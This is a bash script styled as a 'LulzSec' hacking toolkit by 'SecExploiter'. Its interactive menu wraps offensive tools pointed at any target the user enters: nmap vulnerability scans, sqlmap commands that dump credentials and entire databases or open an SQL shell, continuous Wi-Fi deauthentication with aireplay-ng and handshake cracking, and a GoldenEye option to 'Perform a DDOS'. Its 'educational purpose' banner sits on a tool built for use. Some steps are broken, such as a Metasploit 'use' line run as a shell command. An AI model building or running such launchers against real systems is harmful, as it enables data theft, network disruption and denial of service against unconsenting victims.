#!/bin/bash
# etc etc etc
# ..................
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
resize -s 30 60
clear                                   # Clear the screen.
SERVICE=service;

if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service metasploit start
fi 
mkdir ~/Desktop/temp 
clear
clear
echo -e 
echo -e 
echo -e    "\E[1;31m        . /%%                 /%%            /%%%%%% "
echo -e    "\E[1;31m        .| %%                | %%           /%%__  %% "
echo -e    "\E[1;31m        .| %%       /%%   /%%| %% /%%%%%%%%| %%  \__/  /%%%%%%   /%%%%%%% "
echo -e    "\E[1;31m        .| %%      | %%  | %%| %%|____ /%%/|  %%%%%%  /%%__  %% /%%_____/ "
echo -e    "\E[1;31m        .| %%      | %%  | %%| %%   /%%%%/  \____  %%| %%%%%%%%| %%         "
echo -e    "\E[1;31m        .| %%      | %%  | %%| %%  /%%__/   /%%  \ %%| %%_____/| %%             "
echo -e    "\E[1;31m        .| %%%%%%%%|  %%%%%%/| %% /%%%%%%%%|  %%%%%%/|  %%%%%%%|  %%%%%%%     "
echo -e    "\E[1;31m        .|________/ \______/ |__/|________/ \______/  \_______/ \_______/       "
echo -e    "\E[1;31m         TOOLKIT TOOLKIT TOOLKIT TOOLKIT TOOLKIT TOOLKIT TOOLKIT TOOLKIT                "
echo -e 
echo -e 
echo -e    "\E[1;31m                         ______________________________                                            "
echo -e    "\E[1;31m                        |                              |                                                    "
echo -e    "\E[1;31m                        |      BY:  SecExploiter       |                                "
echo -e    "\E[1;31m                        |                              |                                                    "
echo -e    "\E[1;31m                        | \e[33mONLY FOR EDUCATIONAL PURPOSE \E[1;31m|                                                   "
echo -e    "\E[1;31m                        |______________________________|                                                        "
echo -e    "\E[1;31m                                                                         "
echo -e    "\E[1;31m                                                                                                     "

read -p "Press [Enter] key to Continue......."
clear
echo -e   "\E[1;31m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                    "
echo -e   "\E[1;31m%                                                                               %         "
echo -e   "\E[1;31m%       . /%%                 /%%            /%%%%%%                            %              "                         
echo -e   "\E[1;31m%       .| %%                | %%           /%%__  %%                           %             "
echo -e   "\E[1;31m%       .| %%       /%%   /%%| %% /%%%%%%%%| %%  \__/  /%%%%%%   /%%%%%%%       %          "
echo -e   "\E[1;31m%       .| %%      | %%  | %%| %%|____ /%%/|  %%%%%%  /%%__  %% /%%_____/       %      "
echo -e   "\E[1;31m%       .| %%      | %%  | %%| %%   /%%%%/  \____  %%| %%%%%%%%| %%             %      "
echo -e   "\E[1;31m%       .| %%      | %%  | %%| %%  /%%__/   /%%  \ %%| %%_____/| %%             %       "
echo -e   "\E[1;31m%       .| %%%%%%%%|  %%%%%%/| %% /%%%%%%%%|  %%%%%%/|  %%%%%%%|  %%%%%%%       %           "
echo -e   "\E[1;31m%       .|________/ \______/ |__/|________/ \______/  \_______/ \_______/       %              "
echo -e   "\E[1;31m%        TOOLKIT TOOLKIT TOOLKIT TOOLKIT TOOLKIT TOOLKIT TOOLKIT TOOLKIT        %                                       "
echo -e "\E[1;31m%                                                                               %              "
echo -e "\E[1;31m%                                                                               %             "           
echo -e "\E[1;31m%    __                                                                         %               "
echo -e "\E[1;31m%    )|     ________________________.------,_ _                   #SecExploiter %              "
echo -e "\E[1;31m%  _/o|_____/  ,____________.__;__,__,__,__,_Y...:::---===----//  #SecExploiter %           "
echo -e "\E[1;31m% |==========\ ;  ;  ;  ;  ; \__,__\__,_____ --__,-.\   OFF  ((   #SecExploiter %            "
echo -e "\E[1;31m%             ----------|__,__/__,__/__/   \\~(\\    -\  THE  \\     #SecExploiter %                            "
echo -e "\E[1;31m%                         \ ==== \          \\--\\     \_______\\    #SecExploiter %              "
echo -e "\E[1;31m%                          | === |           \\--\\                 #SecExploiter %                "
echo -e "\E[1;31m%                          | === |           ( --- )                            %       "
echo -e "\E[1;31m%                         / ==== /           |=====|                            %                   "
echo -e "\E[1;31m%                        |______|                                               %      "
echo -e "\E[1;31m%                                                                               %      "
echo -e "\E[1;31m%                                                                               %      "
echo -e "\E[1;31m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%       "
echo -e "\e[31m%-------------------------[ \e[97mSELECT AN OPTION TO BEGIN \E[1;31m]-------------------------%          "
echo -e "\E[1;31m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%       " 
echo -e "%                                                                               %             " 
echo -e "\e[31m%%%\e[33m[x] \e[33mInstall                         \e[33m [Install necessary Tools]\E[1;31m               %      "         
echo -e "\e[31m%%%[1] \e[31mScanning                        \e[31m [Go into Nmap Menu]\E[1;31m                     %"                          
echo -e "\e[31m%%%[2] \e[31mExploit                         \e[31m [Go into Metasploit Menu]\E[1;31m               %    "  
echo -e "\e[31m%%%[3] \e[31mSql-Injection                   \e[31m [Go into Sqlmap Menu]\E[1;31m                   %  "
echo -e "\e[31m%%%[4] \e[31mWifi-Cracking                   \e[31m [Go into Aircrack-ng Menu]\E[1;31m              %  "
echo -e "\e[31m%%%[5] \e[31mPassword-Cracking               \e[31m [Go into Hashcat Menu]\E[1;31m                  %   "
echo -e "\e[31m%%%[6] \e[31mDDOS                            \e[31m [Go into Goldeneye Menu]\E[1;31m                %    "
echo -e "%                                                                               %             " 
echo -e "\e[31m%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\e[31m% "
echo -e "\e[31mOption:" 
tput sgr0
read options

case "$options" in
# Note variable is quoted.

  "x" | "x" )
  # Accept upper or lowercase input.
  echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mInstall Menu \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
  
PS3='Enter your choice 7=Quit: '
options=("Install Nmap" 
         "Install Metasploit" 
         "Install Sqlmap" 
         "Install Aircrack-ng" 
         "Install Hashcat" 
         "Install Goldeneye"         
         "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Install Nmap")
            sudo apt-get install nmap             
            ;;
        "Install Metasploit")
            sudo apt-get install msfconsole     
            ;;
        "Install Sqlmap")
            sudo apt-get install sqlmap          
            ;;
        "Install Aircrack-ng")
            sudo apt-get install aircrack-ng          
            ;;
        "Install Hashcat")
            sudo apt-get install hashcat       
            ;;
        "Install Goldeneye")
            sudo apt-get install goldeneye       
            ;;               
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
 ;;


  "1" | "1" )
  # Accept upper or lowercase input.
  echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mNmap Menu \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
  
PS3='Enter your choice 8=Quit: '
options=("Nmap all Options" 
         "Scan all Ports" 
         "Scan specific Ports" 
         "Scan for Vulnerabilities" 
         "Search for Devices" 
         "Show Traceroute" 
         "Scan for Service/Version" 
         "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Nmap all Options")
            nmap             
            ;;
        "Scan all Ports")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'IP/URL: ' uservar
            nmap $uservar   
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"         
            ;;
        "Scan specific Ports")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'IP/URL: ' uservar; read -p 'PORT: ' userport
            nmap $uservar -p$userport   
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"           
            ;;
        "Scan for Vulnerabilities")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'IP/URL: ' uservar
            nmap --script vuln $uservar 
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"           
            ;;
        "Search for Devices")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'IP: ' uservar
            nmap -T5 $uservar/24 
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"          
            ;;
        "Show Traceroute")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'IP/URL: ' uservar
            sudo nmap -sn -Pn --traceroute $uservar  
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"                  
            ;;
        "Scan for Service/Version")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'IP/URL: ' uservar
            nmap -sV $uservar
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"           
            ;;                 
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
 ;;
 
 "2" | "2" )
  # Accept upper or lowercase input.
  echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStarting Metasploit \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
  msfconsole
  use exploit/multi/handler  

;;

   

 "3" | "3" )
  # Accept upper or lowercase input.
  echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mSqlmap Menu \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
  
PS3='Enter your choice 11=Quit: '
options=( "Sqlmap all Options" 
          "Show User and Password" 
          "Show Database" 
          "Show Tables" 
          "Show Columns" 
          "Dump Files"
          "Dump whole Database"           
          "Level (1-5) and Risk (1-3)"
          "Privileges"
          "Sql-Shell"
          "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Sqlmap all Options")
            sqlmap -hh             
            ;;
        "Show User and Password")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'URL: ' uservar
            sqlmap -u $uservar --threads 10 --users --passwords  
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"       
            ;;
        "Show Database")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'URL: ' uservar
            sqlmap -u $uservar --threads 10 --dbs 
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"         
            ;;
        "Show Tables")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'URL: ' uservar; read -p 'Database: ' userport 
            sqlmap -u $uservar -D $userport --threads 10 --tables
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"           
            ;;
        "Show Columns") 
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'URL: ' uservar; read -p 'Database: ' userport; read -p 'Tables: ' userid            
            sqlmap -u $uservar -D $userport -T $userid --threads 10 --columns
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"            
            ;;
        "Dump Files")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'URL: ' uservar; read -p 'Database: ' userport; read -p 'Tables: ' userid; read -p 'Columns: ' usercol
            sqlmap -u $uservar -D $userport -T $userid -C $usercol --threads 10 --dump
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"                   
            ;;
        "Dump whole Database")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'URL: ' uservar; read -p 'Database to dump: ' userport
            sqlmap -u $uservar -D $userport --threads 10 --dump-all
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"           
            ;;       
        "Level (1-5) and Risk (1-3)")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'URL: ' uservar; read -p 'Level (1-5): ' userport; read -p 'Risk (1-3): ' userid 
            sqlmap -u $uservar -threads 10 --level $userport --risk $userid 
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"            
            ;; 
        "Privileges")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'URL: ' uservar
            sqlmap -u $uservar --threads 10 --privileges
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"          
            ;;  
        "Sql-Shell")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart scanning \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'URL: ' uservar
            sqlmap -u $uservar --sql-shell
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished scanned \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"          
            ;;                                                                                                             
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done 
 
;;

 "4" | "4" )
  # Accept upper or lowercase input.
  echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mAircrack-ng Menu \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
  
PS3='Enter your choice 11=Quit: '
options=("Aircrack-ng all Options" 
         "Iwconfig" 
         "Start Airmon-ng" 
         "Iwconfig" 
         "Start Airodump-ng" 
         "Airodump-ng Options" 
         "Start Aireplay-ng" 
         "Stop Airmon-ng"
         "Iwconfig"
         "Crack with Aircrack-ng"
         "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Aircrack-ng all Options")
            aircrack-ng             
            ;;
        "Iwconfig")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"    
            iwconfig  
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"         
            ;;
        "Start Airmon-ng")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"    
            read -p 'INTERFACE: ' uservar
            sudo airmon-ng start $uservar   
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"           
            ;;
        "Iwconfig")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"    
            iwconfig 
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"               
            ;;
        "Start Airodump-ng") 
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"          
            sudo airodump-ng wlp2s0mon
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"            
            ;;
        "Airodump-ng Options")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"    
            read -p 'CHANNEL: ' uservar; read -p 'FILE-NAME: ' userport; read -p 'BSSID: ' userid
            sudo airodump-ng -c $uservar -w $userport -d $userid wlp2s0mon
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"                      
            ;;
        "Start Aireplay-ng")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"    
            read -p 'BSSID: ' uservar; read -p 'STATION: ' userport
            sudo aireplay-ng --deauth 0 -a $uservar -c $userport wlp2s0mon
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"           
            ;;
        "Stop Airmon-ng")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"    
            sudo airmon-ng stop wlp2s0mon
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"           
            ;; 
        "Iwconfig")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"    
            iwconfig
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"            
            ;; 
        "Crack with Aircrack-ng")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"    
            read -p 'FILE-NAME: ' uservar; read -p 'DIRECTORY: ' userport
            sudo aircrack-ng $uservar -w $userport
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"        
            ;;                                                                            
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done  

;;


 "5" | "5" )
  # Accept upper or lowercase input.
  echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStarting Hashcat \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
  hashcat --help

;;

 "6" | "6" )
  # Accept upper or lowercase input.
  echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mGoldeneye Menu \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
  
PS3='Enter your choice 3=Quit: '
options=("Goldeneye all Options" 
         "Perform a DDOS"          
         "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Goldeneye all Options")
            goldeneye             
            ;;
        "Perform a DDOS")
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mStart \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
            read -p 'URL: ' userurl; read -p 'Workers (default: 10): ' uservar; read -p 'Sockets (default: 500): ' userport; read -p 'Method get/post/random (default: get): ' userid
            goldeneye $userurl -w $uservar -s $userport -m $userid 
            echo -e "\E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! \e[97mFinished \E[1;31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"          
            ;;                                                                            
        "Quit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
  
;;


          * )
   # Default option.      
   # 
   echo
   echo "Invalid Option."
  ;;

esac

tput sgr0                               # Reset colors to "normal."

echo

exit 0
